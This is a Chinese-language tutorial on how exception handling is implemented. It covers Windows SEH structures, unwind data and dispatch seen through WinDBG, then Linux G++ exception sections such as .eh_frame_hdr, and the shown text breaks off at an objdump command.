#  PWN入门：异常变漏洞   
福建炒饭乡会  看雪学苑   2025-02-15 09:59  
  
```
```  
  
程序出现错误是难免的情况，程序语言和系统为了辅助程序排查问题，设立了各种机制。  
  
  
**第一种机制是断言检查assert，**该函数接受一个表达式作为参数，如果表达式值为假，就会输出错误信息并终止程序。  
  
  
```
#include <assert.h>
void assert(scalar expression);

```  
  
  
  
打印示例如下：  
  
  
```
main: Assertion `argc > 1' failed.
Aborted (core dumped)

```  
  
  
  
**第二种是信号捕捉机制，**信号由内核传递给用户态程序，一般来讲程序收到信号后会执行默认操作，比如收到SIGKILL后直接杀死程序，当然C语言中允许程序自定义信号处理函数。  
  
  
由于信号对于程序来讲是未知的，所以信号捕捉机制可以帮助我们了解程序收到了什么信号，以及什么程序发出的信号等等问题，缓解了未知信号对程序的影响。  
  
  
**第三种是错误码机制，**不管是函数的返回值还是errno都算作是错误码机制，它们用于衡量执行体是否产生了预期内的错误，当错误产生后，返回值和errno都会被赋上一个特殊值，当判断语句检测到特殊值后，会进行相应的处理。  
  
  
一般来讲非指针类型的返回值，在没有发生错误时，会将返回值设置成0，发生错误时会设置成负数。指针类型的返回值，在没有发生错误时，会返回正常的地址，发生错误时会返回NULL。  
  
  
C语言中的errno是ISO C和POSIX标准共同定义的，标准C定义了一系列的已知错误，每种错误信息都有唯一的序号，GLibC中定义了一个名为errno的全局变量，用于记录最近发生的已知错误序号，程序可以通过errno.h头文件使用该全局变量。  
  
  
errno只是一个数字，它是晦涩难懂的，因此GLibC封装了perror函数，该函数会根据errno，打错误序号对应的警告信息。  
  
  
```
void perror(const char *s);

```  
  
  
  
**第四种是异常处理机制，**在程序语言中，经常可以看到try {...} catch {...}语句的身影，它代表程序会捕捉try {}中执行体发生的异常，然后交给catch {}处理。  
  
  
异常机制可以算作是信号机制的扩展，它们都是在捕获到某信息后，把执行流程交给指定的执行体处理，区别在于异常机制不止可以捕获信号。  
  
  
异常机制还能捕获哪些信息呢？还包含编程语言或系统环境抛出的错误信息。  
  
  
那么异常处理机制是如何实现的呢？下面以C与C++作为目标语言，以Windows和Linux两大平台为例进行探讨。  
  
## Windows平台  
  
如果你熟悉C语言，应该会知道标准C是没有提供异常处理机制的。这点被延续到Linux当中。  
  
  
如果你熟悉Windows开发，并对Windows历史有一些了解的话，应该会知道Windows下C语言开发常常会使用一些Winodws自定义的东西，但它们又好像不是标准C的东西。  
  
  
是的，Windows对标准C的语法进行了扩展，C与C++使用同一套异常处理机制。  
  
### Windows下的异常机制简介  
  
Windows针对异常机制，基于标准C扩展出了下面三条语句，其中__try {}标明了捕获结构化异常的范围，位于范围外的语句产生异常时，并不会被捕捉到。  
  
  
```
Windows中的头文件：
#include <excpt.h>

Windows中的定义：
__try {...}
__except {...}
__finial {...}

```  
  
  
  
当__try {}中语句出现导致程序产生异常事件时，__except {}会将该事件拦截下来，将控制权交到自己手上。  
  
  
__finial {}会在__try {}结束后执行，不管异常是否出现，它都会执行。  
  
  
Windows提供AbnormalTermination接口，用于了解程序是否非正常退出__try，才进入到__finial内部（正常退出返回假，反之则返回真）。  
  
  
```
Bool AbnormalTermination(void);

```  
  
  
  
严格来讲，不只是异常导致的退出才算非正常退出，像break、goto等流程控制语句离开__try时，也算作是非正常退出。  
  
  
除了这些，Windows还定义了两种接口用于获取异常信息，GetExceptionInformation接口用于获取异常描述信息EXCEPTION_POINTERS的结构体指针，GetExceptionCode接口用于获取异常序号，这个两个接口可以帮助我们了解到底什么原因导致了异常产生。  
  
  
```
LPEXCEPTION_POINTERS GetExceptionInformation(VOID);
DWORD GetExceptionCode(VOID);

```  
  
  
  
基于__try的异常捕获机制，在Windows中也被称作是结构化异常SEH Structured Exception Handling，它需要与函数体中的执行体绑定，当函数体内出现__try语句时，函数会绑定一个异常处理器（多个__try语句也是一样），异常处理器会遵循__except和__finial中设定好的逻辑对异常和终止进行处理。  
  
  
在WinDBG中，可以借助扩展命令!exchain，查看当前线程下的有效处理器。!exchain会逐栈帧进行遍历，查找函数中存在的处理器。  
  
  
```
!exchain
12 stack frames, scanning for handlers...
Frame 0x01: ntdll!RtlDispatchException+0xae (00007ff9`4d03f13e)
  ehandler ntdll!_GSHandlerCheck (00007ff9`4d14a94c)
Frame 0x03: KERNELBASE!RaiseException+0x8a (00007ff9`4a4b837a)
  ehandler KERNELBASE!_GSHandlerCheck (00007ff9`4a51ff8c)
Frame 0x04: ConsoleApplication1!test+0xf9 (00007ff7`63d860a9)
  ehandler ConsoleApplication1!ILT+770(__GSHandlerCheck_SEH) (00007ff7`63d81307)
Frame 0x07: ConsoleApplication1!__scrt_common_main_seh+0x132 (00007ff7`63d823d2)
  ehandler ConsoleApplication1!ILT+45(__C_specific_handler) (00007ff7`63d81032)
Frame 0x0b: ntdll!RtlUserThreadStart+0x2c (00007ff9`4d0ffbcc)
  ehandler ntdll!_C_specific_handler (00007ff9`4d143d00)

```  
  
###   
### 二进制文件对SEH的支持  
  
Windows程序在编译会在.pdata段中产生一段特殊的数据，这段数据可以看作是一张表，该表包含程序所有用到的函数，表中元素由RUNTIME_FUNCTION结构体定义，其中的UnwindInfo成员指的是栈展开信息，其余两个成员分别函数起始地址和结束地址。  
  
  
栈展开信息通常都是和异常处理绑定的。  
  
  
大部分支持递归的程序语言都会使用栈记录正在执行的函数信息，当异常抛出时，栈上可能还停留着未释放的变量，通过栈展开信息我们可以将函数栈复原，并对未释放变量进行销毁。  
  
  
```
dt _IMAGE_RUNTIME_FUNCTION_ENTRY
   +0x000 BeginAddress     : Uint4B
   +0x004 EndAddress       : Uint4B
   +0x008 UnwindInfoAddress : Uint4B
   +0x008 UnwindData       : Uint4B

struct RUNTIME_FUNCTION
{
    void *__ptr32 FunctionStart __offset(OFF64|RVAOFF);
    void *__ptr32 FunctionEnd __offset(OFF64|RVAOFF|PASTEND);
    void *__ptr32 UnwindInfo __offset(OFF64|RVAOFF);
};

struct UNWIND_INFO_HDR
{
    char Ver3_Flags __hex;
    char PrologSize __hex;
    char CntUnwindCodes __hex;
    char FrReg_FrRegOff __hex;
};

dt _UNWIND_INFO
ConsoleApplication1!_UNWIND_INFO
   +0x000 Version          : Pos 0, 3 Bits
   +0x000 Flags            : Pos 3, 5 Bits
   +0x001 SizeOfProlog     : UChar
   +0x002 CountOfCodes     : UChar
   +0x003 FrameRegister    : Pos 0, 4 Bits
   +0x003 FrameOffset      : Pos 4, 4 Bits
   +0x004 UnwindCode       : [1] _UNWIND_CODE

```  
  
  
  
目前已知的情况是test函数内部有三个__try语句，其中两个是嵌入包含的关系，有两个__try语句匹配__finally语句，一个__try语句匹配__except语句。  
  
  
```
test
__try {
    ......
    __try {
        ......
    }
    __finally {
        ......
    }
}
__except (puts("filter"), EXCEPTION_EXECUTE_HANDLER) {
    ......
}
__try {
    ......
}
__finally {
    ......
}

```  
  
  
  
在生成的.pdata中，我们可以看到针对test函数生成的信息，一般来讲，一个函数只对应一个RUNTIME_FUNCTION表现，这里test函数因为异常处理的原因，多个很多表项。  
  
  
```
.pdata
1. RUNTIME_FUNCTION <rva test, rva byte_140016165, rva stru_14001CCA4>
2. RUNTIME_FUNCTION <rva test$fin$0, rva test$filt$1, rva stru_14001CC88>
3. RUNTIME_FUNCTION <rva test$filt$1, rva test$fin$2, rva stru_14001CC94>
4. RUNTIME_FUNCTION <rva test$fin$2, rva byte_140018475, rva stru_14001C694>

```  
  
  
  
1号RUNTIME_FUNCTION中的UnwindInfo信息是记录处理器的地方。  
  
  
```
stru_14001CCA4  UNWIND_INFO_HDR <19h, 49h, 5, 45h>
    ......
    dd rva j___GSHandlerCheck_SEH

```  
  
  
  
2号到4号RUNTIME_FUNCTION主要记录了__finally {}的起始地址和__except (xx)（筛选器）的起始地址信息。  
  
  
在WinDBG中，可以借助.fnnet命令查看指定函数的RUNTIME_FUNCTION和UNWIND_INFO_HDR信息。  
  
  
```
.fnent ConsoleApplication1!test
Exact matches:
    ConsoleApplication1!test (int, int, int, int, int, int)

BeginAddress      = 00000000`00015fb0
EndAddress        = 00000000`00016165
UnwindInfoAddress = 00000000`0001cca4

Unwind info at 00007ff6`78e3cca4, 18 bytes
  version 1, flags 3, prolog 49, codes 5
  frame reg 5 (rbp), frame offs 40h
  handler routine: ConsoleApplication1!ILT+770(__GSHandlerCheck_SEH) (00007ff6`78e31307), data 3
  00: offs 20, unwind op 3, op info 4	UWOP_SET_FPREG.
  01: offs 1b, unwind op 1, op info 0	UWOP_ALLOC_LARGE FrameOffset: 198.
  03: offs 14, unwind op 0, op info 7	UWOP_PUSH_NONVOL reg: rdi.
  04: offs 13, unwind op 0, op info 5	UWOP_PUSH_NONVOL reg: rbp.

```  
  
  
  
下面会结合二进制文件与.fnnet命令输出的UnwindInfo信息进行分析。  
  
  
```
stru_14001CCA4  UNWIND_INFO_HDR <19h, 49h, 5, 45h>
    ; DATA XREF: .pdata:000000014001FD64↓o
    UNWIND_CODE <<20h, 3, 4>> ; UWOP_SET_FPREG
    UNWIND_CODE <<1Bh, 1, 0>> ; UWOP_ALLOC_LARGE
    dw 33h
    UNWIND_CODE <<14h, 0, 7>> ; UWOP_PUSH_NONVOL
    UNWIND_CODE <<13h, 0, 5>> ; UWOP_PUSH_NONVOL
    align 4
    dd rva j___GSHandlerCheck_SEH

```  
  
  
  
Unwind info at是UnwindInfo信息开始标志，后面的地址是UnwindInfo信息所在内存的地址，它是基地址加上UnwindInfoAddress得到的结果。  
  
  
UNWIND_INFO_HDR中的0x19通过二进制查看，0x19对应二进制b0001 1001，前三个比特位b001对应version，后面的b011对应flags。  
  
  
flags的数值来源于下方的四种类别，当前值为0x3，说明函数内部同时含有异常处理程序和终止处理程序，这可以和test函数呼应上。  
  
  
```
UNW_FLAG_NHANDLER  | 0x0 | 无处理程序
UNW_FLAG_EHANDLER  | 0x1 | 有异常处理程序
UNW_FLAG_UHANDLER  | 0x2 | 有终止处理程序
UNW_FLAG_CHAININFO | 0x4 | FunctionEntry是先前函数表的表项。

```  
  
  
  
0x49对应的是prolog，prolog对应函数序言的大小。  
  
  
0x5对应的是codes，它记录了UnwindCode的数量。  
  
  
0x45对应的是栈帧信息，它也需要从二进制的角度观察，比特0到比特4对应栈帧寄存器（0x5），其余比特位对应栈帧寄存器偏移（0x40），栈帧寄存器指的就是栈，它保存上的局部变量，0x5代表局部变量区域的起始编号，0x4乘0x10就是局部变量区域相对于栈底rsp的偏移值大小。  
  
  
接下来就是UnwindCode，UnwindCode记录了函数需要中操作rsp和非易失寄存器的指令信息，它由三部分组成<<1, 2, 3>> xxx，此处以<<20h, 3, 4>> UWOP_SET_FPREG为例进行讲解，0x20代表指令相对于起始地址的偏移值，3与UWOP_SET_FPREG是一样的，代表指令类型，4操作的寄存器信息，4对应rsp寄存器。  
  
  
```
起始为0xb0
0xc3 push    rdi
0xc4 sub     rsp,198h
0xcb lea     rbp,[rsp+40h]
0xd0 lea     rdi,[rsp+40h]

```  
  
  
  
最后一项就是处理器信息，如果flags中显示函数存在处理器，那么这里就会有内容，它是可选的内容，并不是必要的。  
  
### Windows处理异常的基本流程  
  
CPU发现异常时，会先通过IDT表找到内核异常处理函数，当内核发现异常发生在用户态空间时，内核会把控制权交还给用户态程序。  
  
  
回到用户态程序时，会先进入KiUserExceptionDispatch函数处理异常，该函数会通过RtlDispatchException函数会查找异常处理器，并对异常进行处理。  
  
  
```
ntdll!KiUserExceptionDispatch
    -> ntdll!RtlDispatchException

```  
  
  
  
这两个函数都源自于动态链接库ntdll，ntdll的全称是NT Layer DLL，它是NT内核的一部分，用于提供用户态程序与内核的交互接口，这里的异常处理就是一个实例，RTL的全称是Runtime Library，即运行时库，RTL一部分于ntdll中，还有一部分位于ntoskrnl中，ntoskrnl是NT内核的基石，它是Windows上最先启动的进程，当它运行后，其余的所有程序都会在它的管控之下工作。  
  
  
在了解RtlDispatchException函数如何分发异常之前，我么先来了解一下典型的Windows程序函数序言、结语与栈结构。  
  
### Windows程序的函数序言  
  
从函数序言和结语的汇编代码中，可以看到Windows的实现貌似比Linux更加复杂。  
  
  
```
当前函数中局部变量：1个缓冲区变量A
缓冲区变量A的大小：0x30

函数序言：
push    rbp
push    rdi
sub     rsp,148h
lea     rbp,[rsp+30h]
lea     rdi,[rsp+30h]
mov     ecx,16h
mov     eax,0CCCCCCCCh
rep stos dword ptr [rdi]
mov     rax,qword ptr [ConsoleApplication1!__security_cookie]
xor     rax,rbp
mov     qword ptr [rbp+108h],rax
lea     rcx,[ConsoleApplication1!_NULL_IMPORT_DESCRIPTOR]
call    ConsoleApplication1!ILT+880(__CheckForDebuggerJustMyCode)

```  
  
  
  
在函数序言中，先将rbp和rdi压入栈内进行保存，然后分配了0x148的栈空间，这个空间是远比局部变量占用的空间大的，换做Linux平台，应该就只会给栈分配[0x30 - 0x50]的空间了，最少是0x30，有金丝雀的话要占0x10的栈空间，如果是main函数接收了argc和argv，那么它们也会占用0x10的栈空间。  
  
  
分配完栈空间后，会更新rbp和rdi。  
  
  
接着根据rep指令的要求，重复执行stos指令，stos指令的全名是store string data，从它的英文全名可以知道stos指令被用于处理字符串数据。stos指令处理数据的依据是rdi、df，rax以及rcx寄存器，其中rdi代表起始地址，rcx代表循环次数，每循环一次地址就加减0x4，至于到底是加还是减需要根据df判断，df的全称是direction flag，代表方向寄存器，df为0时为加，反之则为减。除此之外，还有一个未提到的关键寄存器rax，内存里面放什么数据呢？答案就是rax中的内容。  
  
  
这也是rdi存在的目的，rdi在rep和stos指令运行期间，数值是不断变化的，直接使用rbp并不合适，所以先让rdi等于rbp，之后根据rdi进行设置，就可以达到和rbp一样的效果，并且不用rdi变化带来不好的影响。  
  
  
rax被初始化成了4字节的0xcc，0xcc是int3指令的16进制数值，int3指令也被称作是软件断点指令，不管是WinDBG还是GDB，在设置软件断点时，都是在被中断的地址前放置0xcc，当程序碰到int3指令后，就会陷入内核，内核会向调试器发送信号，告诉被调试的程序已经运行到了设置断点的地方。  
  
  
先继续往下看，rax数值从0xcccccccc更新成了金丝雀，rax拿到金丝雀后会先与rbp做异或操作，将金丝雀与rbp中相等的比特位清空成0，在这种情况下金丝雀被进一步加固（不管Windows还是Linux，同线程内的金丝雀都是一样的，Windows平台进行的异或操作让金丝雀进一步随机化）。  
  
  
完成金丝雀的加固后，会将金丝雀压到栈上。  
  
  
此刻金丝雀和断点指令共同担任了栈的保护屏障。  
  
  
序言的最后一部分是调用__CheckForDebuggerJustMyCode函数，它是Visual Studio的一项特殊支持，一般来讲调试版本都会开启，也可以在属性页内将它关闭。它的作用是让调试器跳过非自身代码（比如动态链接库），专注于项目本身，该机制也被称作是JMC。  
  
  
前面放入rcx寄存器中的_NULL_IMPORT_DESCRIPTOR，描述它的结构体是IMAGE_IMPORT_DESCRIPTOR，该结构用于记录导入表的信息，它会辅助JMC进行检查，这是因为程序需要的外部信息，都被记录在导入表内。  
  
  
首次经过__CheckForDebuggerJustMyCode函数后，你会发现在每个函数的栈中，金丝雀的上方都会压入_NULL_IMPORT_DESCRIPTOR的地址。  
  
### Windows程序的函数结语  
  
函数结语第一步做的就是调用_RTC_CheckStackVars函数检查局部变量。  
  
  
从rbp+0x108的位置取出更新过的金丝雀，然后通过xor指令还原数值（如果金丝雀为未变化就可以还原），再调用__security_check_cookie检查金丝雀是否正确。  
  
最后就是还原rsp、rbp、rdi到函数调用前的状态。  
  
  
与Linux不同的是，Windows中的PE文件会专门在.data中设置一段区域存放金丝雀，程序启动时，.data中的金丝雀数值都会被更新。  
  
  
```
函数结语：
lea     rcx,[rbp-30h]
lea     rdx,[ConsoleApplication1!__xt_z+0x1e0]
call    ConsoleApplication1!ILT+780(_RTC_CheckStackVars)
mov     rcx,qword ptr [rbp+108h]
xor     rcx,rbp
call    ConsoleApplication1!ILT+430(__security_check_cookie)
lea     rsp,[rbp+118h]
pop     rdi
pop     rbp

```  
  
  
  
这里针对_RTC_CheckStackVars函数继续说明一下。  
  
  
首先从函数序言和结语中，我们可以发现函数传递形参的寄存器貌似发生了变换，好像跟我们熟悉的Linux不同。虽然现在Windows和Linux平台都是使用fastcall调用协议，但是它们对寄存器的要求并不一样。  
  
  
```
Linux：
rdi, rsi rdx, rcx, r8, r9

Windows：
rcx, rdx, r8, r9

```  
  
  
  
_RTC_CheckStackVars函数接收了rbp - 0x30和__xt_z信息两个参数，它会根据这两个参数检查栈上的局部变量。  
  
  
第一个参数是rbp - 0x30，在理想情况下，rbp - 0x30应该就是栈顶rsp的值。  
  
  
第二个参数是函数内部局部变量信息，00007ff701d6ac80上存储着局部变量的数量（当前为1），00007ff701d6ac88上存储着局部变量的属性信息，局部变量属性信息00007ff701d6ac40上存储着局部变量的偏移值，00007ff701d6ac44上存储着局部变量的大小（当前为0x30），00007ff701d6ac48上存储着局部变量名。  
  
  
在代码层面，描述参数二的任务由_RTC_framedesc和_RTC_vardesc共同完成。  
  
  
```
dt _RTC_framedesc
ConsoleApplication1!_RTC_framedesc
   +0x000 varCount         : Int4B
   +0x008 variables        : Ptr64 _RTC_vardesc

dt _RTC_vardesc
ConsoleApplication1!_RTC_vardesc
   +0x000 addr             : Int4B
   +0x004 size             : Int4B
   +0x008 name             : Ptr64 Char

```  
  
  
  
_RTC_CheckStackVars函数针对局部变量检查的依据就是0xcc，如果发现局部变量范围外的0xcc屏障被破坏，就说明局部变量有问题。  
  
  
```
当前局部变量名：buf

dd rdx (lea rdx,[ConsoleApplication1!__xt_z+0x1e0])
00007ff7`01d6ac80  00000001 00000000 01d6ac40 00007ff7

dd 00007ff701d6ac40
00007ff7`01d6ac40  00000038 00000030 01d6ac30 00007ff7

dd 00007ff701d6ac30
00007ff7`01d6ac30  00667562 00000000 00000000 00000000

.formats 00667562 
Evaluate expression:
  Chars:   .....fub

rsp地址：00000072`4d8ffbd0
rbp地址：00000072`4d8ffc00
buf地址：00000072`4d8ffc08
buf地址与rsp地址相差0x38

```  
  
###   
### Windows程序的栈布局  
  
到这里我们可以发现，Windows程序的栈空间跟Linux程序的栈空间有很大的区别。  
  
  
```
真正的栈底：000000724d8ffd18
rsp地址：00000072`4d8ffbd0rbp地址：00000072`4d8ffc00

00000072`4d8ffbd0  4d8ffc08 00000072 00000030 0000000000000072`4d8ffbe0  01d6acf8 00007ff7 01d6acf0 00007ff7
00000072`4d8ffbf0  01d6acec 00007ff7 005c0073 006f0043
```  
  
  
  
观察rsp和rbp中间的数据可以发现，这段空间是留给被调用函数保存形参的空间，这里可以包含局部变量、也可以包含全局变量、常量等等。  
  
  
```
向局部变量buf内复制数据：
snprintf(buf, 48, "%s %s", __func__, "end");

rsp前面存储着snprintf需要的形参，从0xcc开始就是局部变量信息：
dd rsp
0000001a`7777f9c0  7777f9f8 0000001a 00000030 000000000000001a`7777f9d0  df1facf8 00007ff7 df1facf0 00007ff7
0000001a`7777f9e0  df1facec 00007ff7 006f0044 006e00770000001a`7777f9f0  cccccccc cccccccc 74736574 646e6520

1a7777f9f8是局部变量的地址，0x30是48，代表复制数据的上限大小
其余的是字符串数据：
    7ff7df1facf8："%s %s"
    7ff7df1facf0："test"
    7ff7df1facec："test end"

```  
  
  
  
全部的局部变量都被放在0xcc填充的保护屏障区域内。  
  
  
局部变量和金丝雀直接还有一段保留空间。  
  
  
金丝雀上方是__CheckForDebuggerJustMyCode存放的_NULL_IMPORT_DESCRIPTOR。  
  
  
```
-----------------------------------------
caller stack    | stack saved args      |
                | register saved args   |
-----------------------------------------
                | callee return address |
                | caller rbp saved      |
                | caller rdi saved      |
-----------------------------------------
callee stack    | import info           |
                | canary                |
                | reserve               |
                | 0xcc, local var, 0xcc |
                | stack saved args      |
                | register saved args   |
-----------------------------------------

```  
  
###   
### Windows程序的异常处理流程  
  
RtlDispatchException函数是Windows程序处理异常的关键所在，它被KiUserExceptionDispatch函数调用。  
  
  
KiUserExceptionDispatch函数可以分成三个部分，第一部分是检查操作，第二、三部分是进行调用异常分发函数。  
  
#### 针对32位程序的检查  
  
第一部分检查WoW64.dll有没有注册自己的异常处理函数，如果发现rax中的数值不为0，那就说明WoW64.dll注册了，接下来先调用rax内保存的函数进行处理，如果发现rax中的数值为0，就会直接调用RtlDispatchException。  
  
  
WoW64的全称是Windows on Windows 64，用于运行32位程序，在Windows中可以看到一个名为System32的目录，它里面实际上存放的是64位系统文件，在32位转换到64位时，不少程序都是直接硬写的System32，出于兼容考虑这个目录名被保留了下来，32位程序对应的目录为SysWow64，它里面实际上存放的是32位系统文件。  
  
  
```
ntdll!KiUserExceptionDispatch：
第一部分：
00007ff9`4d183770 fc              cld00007ff9`4d183771 488b05700b0800  mov     rax,qword ptr [ntdll!Wow64PrepareForException (00007ff9`4d2042e8)]00007ff9`4d183778 4885c0          test    rax,rax
00007ff9`4d18377b 740f            je      ntdll!KiUserExceptionDispatch+0x1c (00007ff9`4d18378c)
第二部分：
00007ff9`4d18377d 488bcc          mov     rcx,rsp00007ff9`4d183780 4881c1f0040000  add     rcx,4F0h
00007ff9`4d183787 488bd4          mov     rdx,rsp00007ff9`4d18378a ffd0            call    rax
第三部分：
00007ff9`4d18378c 488bcc          mov     rcx,rsp00007ff9`4d18378f 4881c1f0040000  add     rcx,4F0h
00007ff9`4d183796 488bd4          mov     rdx,rsp00007ff9`4d183799 e8f2b8ebff      call    ntdll!RtlDispatchException

```  
  
####   
#### 调用异常分发函数的准备  
  
第二三部分调用异常分发函数前，都会将rsp+0x4f0和rsp两个参数传递过去。  
  
  
第一个参数为rsp+0x4f0，它里面记录着_EXCEPTION_RECORD结构体指针，该结构体被用于描述一场发生的原因。  
  
  
其中的ExceptionAddress成员记录着导致异常发生的代码区域。  
  
  
```
dt _EXCEPTION_RECORD @rcx
   +0x000 ExceptionCode    : 1
   +0x004 ExceptionFlags   : 0x80
   +0x008 ExceptionRecord  : (null) 
   +0x010 ExceptionAddress : 0x00007ff9`4a4b837a Void
   +0x018 NumberParameters : 0
   +0x020 ExceptionInformation : [15] 0

ln 0x00007ff9`4a4b837a
(00007ff9`4a4b82f0)   KERNELBASE!RaiseException+0x8a

```  
  
  
  
第二个参数为rsp，它里面记录着_CONTEXT结构体的指针，该结构体被用来描述程序上下文信息，在这里它被用于记录异常发生时的上下文信息。  
  
  
通过ln匹配_CONTEXT结构体中Rip成员记录的数值可以发现，它指向引起异常产生的代码位置（这里为RaiseException）。  
  
  
```
dt _CONTEXT @rdx
    ......
    +0x0f8 Rip              : 0x00007ff9`4a4b837a
    ......

ln 0x00007ff9`4a4b837a
(00007ff9`4a4b82f0)   KERNELBASE!RaiseException+0x8a

```  
  
####   
#### RtlDispatchException的处理方法  
  
进入RtlDispatchException函数内部后，会先检查VEH处理器。Windows提供SEH和向量化异常处理VEH Vectored Exception Handling两种机制处理异常。  
  
  
SEH可以在用户态空间和内核态空间中工作，VEH只能在用户态空间工作，最关键的一点就是VEH是全局有效的，不只关乎与某个被__try包含起来的执行体。  
  
  
VEH处理程序列表存储在LdrpVectorHandlerList内，如果不处理VEH，那么RtlDispatchException就会处理SEH。  
  
  
SEH处理器是跟函数绑定的，这里需要逐栈帧进行遍历。  
  
  
RtlLookupFunctionEntry和RtlpxVirtualUnwind是遍历SEH异常处理器的关键所在。  
  
  
函数第一步要经过的是RtlLookupFunctionEntry函数，该函数的作用是接收地址并找到对应的函数信息RUNTIME_FUNCTION。  
  
  
```
dt _IMAGE_RUNTIME_FUNCTION_ENTRY @rax
ConsoleApplication1!_IMAGE_RUNTIME_FUNCTION_ENTRY
   +0x000 BeginAddress     : 0xc82f0
   +0x004 EndAddress       : 0xc83a2
   +0x008 UnwindInfoAddress : 0x343110
   +0x008 UnwindData       : 0x343110

.fnent KERNELBASE!RaiseException
BeginAddress      = 00000000`000c82f0
EndAddress        = 00000000`000c83a2
UnwindInfoAddress = 00000000`00343110

```  
  
  
  
RtlLookupFunctionEntry函数第一次接收的地址是产生异常处的地址。  
  
  
```
ln rcx
(00007ff9`4a4b82f0)   KERNELBASE!RaiseException+0x8a

```  
  
  
  
RtlpxVirtualUnwind函数的作用是恢复指定函数的父函数上下文，它可以帮助我们从当前函数不断向后查找栈帧，UnwindInfo在RtlpxVirtualUnwind运行过程中起到了重要的作用，当RtlpxVirtualUnwind返回后，RtlLookupFunctionEntry函数就可以得到父函数的函数信息RUNTIME_FUNCTION，使得遍历流程可以继续下去。  
  
  
RtlpxVirtualUnwind返回后会开始根据异常处理器进行异常处理。  
  
  
```
RtlDispatchException
    -> RtlpCallVectoredHandlers
        -> LdrpVectorHandlerList
    -> RtlLookupFunctionEntry
    -> RtlpxVirtualUnwind
    -> RtlpExecuteHandlerForException

```  
  
  
  
RtlpExecuteHandlerForException函数会接受类型为_DISPATCHER_CONTEXT的参数，它作为第四参数存入r9内，RtlpExecuteHandlerForException函数会将偏移0x30处的LanguageHandler成员并调用。  
  
  
```
dt _DISPATCHER_CONTEXT
   ......
   +0x030 LanguageHandler  : Ptr64     _EXCEPTION_DISPOSITION 
   ......

RtlpExecuteHandlerForException
    mov     rax,qword ptr [r9+30h]
    call    rax

```  
  
  
  
如果PE文件中RUNTIME_FUNCTION中的UnwindInfo信息含有异常处理器，那么LanguageHandler成员就可以完成调用，反之则不行。  
  
  
RtlDispatchException函数将RtlpxVirtualUnwind找到的参数按照_DISPATCHER_CONTEXT的定义先存放数据到rbp+0x50的位置。  
  
  
```
mov     qword ptr [rbp+50h],r12
mov     qword ptr [rbp+60h],r13
mov     qword ptr [rbp+68h],rcx
mov     qword ptr [rbp+78h],r14
mov     qword ptr [rbp+80h],r8
mov     qword ptr [rbp+90h],rax
mov     dword ptr [rbp+98h],edx
lea     r9,[rbp+50h]
call    ntdll!RtlpExecuteHandlerForException

```  
  
  
  
一般来讲，默认的异常处理器都是__GSHandlerCheck_SEH。  
  
  
函数中可能具有多个__try结构，它们可能是各自分开的，也可能是嵌套的，__C_specific_handler会借助RtlUnwindEx和RtlpExecuteHandlerForUnwind将嵌套结构找到，然后再次调用__GSHandlerCheck_SEH，直到无法找到嵌套结构。  
  
  
RtlUnwindEx返回时，会通过RtlRestoreContext还原上下文，继续执行原程序。  
  
  
```
__GSHandlerCheck_SEH
    -> _GSHandlerCheckCommon
    -> VCRUNTIME140D!__C_specific_handler
        -> ntdll!RtlUnwindEx
            -> ntdll!RtlpExecuteHandlerForUnwind
                -> __GSHandlerCheck_SEH
            -> ntdll!RtlRestoreContext

```  
  
##   
## Linux平台  
  
Linux平台下的常见编译器GCC并没有对C语言语法进行扩展，在C程序中想要使用异常机制，需要曲线救国，比如使用信号捕捉机制、setjmp与longjmp、以及goto实现。  
  
  
针对C++语言的G++编译器更加强大一些，它是原生支持异常处理机制的。  
  
  
在标准C++中异常处理机制使用的语法变成了try和catch，相较于Windows平台，__except变成了catch，__finally则直接去掉了，C++标准不提供__finally是因为C++有析构函数，析构函数是更好的方案。  
  
  
除此之外，Linux下不再使用RaiseException抛出异常，转为使用throw。  
  
  
Linux和Windows的区别在于，Windows是自定义语法和处理方式，而Linux遵循标准定义。  
  
### 二进制文件对异常处理的支持  
  
假如对生成的ELF文件进行观察，就会发现G++编译器为异常处理添加了下面列出的五条函数，分别针对异常的抛出和捕获以及栈展开。  
  
  
```
throw
    __cxa_throw

catch
    __cxa_begin_catch
    __cxa_end_catch

__cxa_allocate_exception
__cxa_free_exception
_Unwind_Resume

```  
  
  
  
除了这些之外，ELF文件还会生成特殊的GNU_EH_FRAME段，以及.eh_frame_hdr、.eh_frame、.gcc_except_table节。  
  
  
GNU_EH_FRAME段中存放.eh_frame_hdr节，该节的作用是记录.eh_frame节信息。  
  
#### .eh_frame_hdr  
  
.eh_frame_hdr节的定义如下，前四个字节是属性信息，其中包含版本、eh_frame_ptr编码格式、fde_count编码格式以及二分查找表的编码格式。eh_frame_ptr指向.eh_frame的起始地址，fde_count代表二分查找表中表项的数量，最后面的就是二分查找表，表中每个表项都由初始位置和地址两部分组成。  
  
  
```
| unsigned byte | version             |
| unsigned byte | eh_frame_ptr_enc    |
| unsigned byte | fde_count_enc       |
| unsigned byte | table_enc           |
| encoded       | eh_frame_ptr        |
| encoded       | fde_count           |
|               | binary search table |

```  
  
  
  
编码格式的定义分成高低两部分，高位指示如何使用数值，低位表示数值的格式。  
  
  
```
低4位：
| DW_EH_PE_omit      | 0xff | 无效
| DW_EH_PE128        | 0x01 | 无符号且小端字节序
| DW_EH_PE_udata2    | 0x02 | 2字节无符号
| DW_EH_PE_udata4    | 0x03 | 4字节无符号
| DW_EH_FOR_data8    | 0x04 | 8字节无符号
| DW_EH_PE_sleb128   | 0x09 | 有符号且小端字节序
| DW_EH_PE_sdata2    | 0x0A | 2字节有符号
| DW_EH_PE_sdata4    | 0x0B | 4字节有符号
| DW_EH_PE_sdata8    | 0x0C | 8字节有符号

高4位：
| DW_EH_PE_omit      | 0xff | 无效
| DW_EH_PE_absptr    | 0x00 | 可直接使用
| DW_EH_PE_pcrel     | 0x10 | 基地址是当前程序指针
| DW_EH_PE_textrel   | 0x20 | 基地址是.text的起始地址
| DW_EH_PE_datarel   | 0x30 | 基地址是.eh_frame_hdr的起始地址
| DW_EH_PE_funcrel   | 0x40 | 基地址是当前函数
| DW_EH_PE_aligned   | 0x50 | 数值需要和地址对齐

```  
  
  
  
下面给出了示例程序的.eh_frame_hdr节，版本是0x01，eh_frame_ptr_enc是0x1b，代表使用当前程序指针作为基地址，数据类型是有符号的且占用4字节，fde_count_enc是0x03，代表数值可直接使用，数据类型是无符号的且占用4字节，table_enc是0x3b，代表基地址是.eh_frame_hdr的起始地址，数据类型是有符号的且占用4字节。  
  
  
eh_frame_ptr是0x38，fde_count是0x6，代表表中有6个表项，其余部分组成了二分查找表，每个表项占用0x8字节，初始位置和地址各占4字节。  
  
  
```
objdump --section=.eh_frame_hdr -s xxx
